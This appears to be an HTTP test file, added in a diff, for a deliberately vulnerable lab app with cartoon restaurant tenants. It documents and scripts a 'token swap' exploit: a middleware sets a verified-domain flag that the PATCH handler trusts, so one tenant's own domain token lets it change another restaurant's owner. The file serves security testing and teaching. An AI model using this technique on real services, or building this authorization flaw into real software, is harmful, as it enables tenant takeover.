@@ -1,0 +1,118 @@
+# @import ../_imports.http
+
+# =============================================================================
+# VULNERABILITY: R03 Token Swap Hijacks Restaurants (middleware confusion)
+# =============================================================================
+#
+# DESCRIPTION:
+#   The verify_domain_token_middleware() runs before request handlers and sets
+#   g.verified_domain when a valid domain token is present. The PATCH handler
+#   trusts g.verified_domain for authorization instead of checking that the
+#   authenticated restaurant (from API key) matches the path parameter.
+#
+# ATTACK SCENARIO:
+#   Plankton (Chum Bucket owner):
+#   1. Requests domain verification for his own domain (chum-bucket.sea)
+#   2. Receives valid token for chum-bucket.sea
+#   3. Sends PATCH /restaurants/1 (Krusty Krab) with his Chum Bucket token
+#   4. Middleware sets g.verified_domain = "chum-bucket.sea"
+#   5. Handler updates restaurant 1's owner to admin@chum-bucket.sea
+#
+# IMPACT:
+#   Full tenant takeover. Any restaurant owner can hijack any other restaurant
+#   by using their own valid token on another restaurant's path.
+#
+# STATUS: VULNERABLE in v307 (exploit succeeds)
+#         This is the final vulnerability in the r03 series.
+# =============================================================================
+
+# =============================================================================
+# SETUP: Reset database and prepare attack
+# =============================================================================
+
+### Seed the database with fresh state
+# @name seed
+{{
+  await platform.seed();
+  await mailpit.clear();
+}}
+# @ucskip
+# @tag r03, restaurants, v307, vulnerable
+GET /menu
+
+# Use a static domain that we control via mailpit
+@attackerDomain = hijack-test.sea
+
+
+### Verify Krusty Krab's original owner
+# @name verify_original_owner
+# @forceRef seed
+# @tag r03, restaurants, v307, vulnerable
+GET /restaurants/1/
+
+?? js $(response).isOk() == true
+?? js $(response).field("owner_email") == mr.krabs@krusty-krab.sea
+
+
+# =============================================================================
+# EXPLOIT: Token swap to hijack another restaurant
+# =============================================================================
+
+### Step 1: Request domain verification for attacker's own domain
+# @name request_token
+# @forceRef verify_original_owner
+# @tag r03, restaurants, v307, vulnerable
+POST /restaurants
+Content-Type: application/json
+
+{
+  "name": "Evil Corp",
+  "domain": "{{attackerDomain}}"
+}
+
+?? js $(response).isOk() == true
+?? js $(response).field("status") == verification_email_sent
+
+
+### Step 2: Get the attacker's domain verification token
+# @name get_token
+# @forceRef request_token
+{{
+  const token = await mailpit.lastEmail("admin@hijack-test.sea").userToken();
+  exports.attackerToken = token;
+}}
+# @tag r03, restaurants, v307, vulnerable
+GET /menu
+
+?? js exports.attackerToken != null
+
+
+### Step 3: EXPLOIT - Use attacker's token to hijack Krusty Krab!
+# Path: /restaurants/1 (Krusty Krab)
+# Token: for attackerDomain (Plankton's domain)
+# Middleware sets g.verified_domain = attackerDomain
+# Handler trusts the token and updates restaurant 1's owner!
+# @name exploit_hijack
+# @forceRef get_token
+# @tag r03, restaurants, v307, vulnerable
+PATCH /restaurants/1
+X-API-Key: {{auth.restaurant("chum_bucket")}}
+Content-Type: application/json
+
+{
+  "domain": "{{attackerDomain}}",
+  "token": "{{attackerToken}}"
+}
+
+# VULNERABLE: Exploit succeeds - restaurant hijacked
+?? js $(response).isOk() == true
+
+
+### Step 4: Verify the hijack - Krusty Krab now belongs to attacker
+# @name verify_hijack
+# @forceRef exploit_hijack
+# @tag r03, restaurants, v307, vulnerable
+GET /restaurants/1/
+
+?? js $(response).isOk() == true
+?? js $(response).field("owner_email").includes("hijack-test.sea") == true
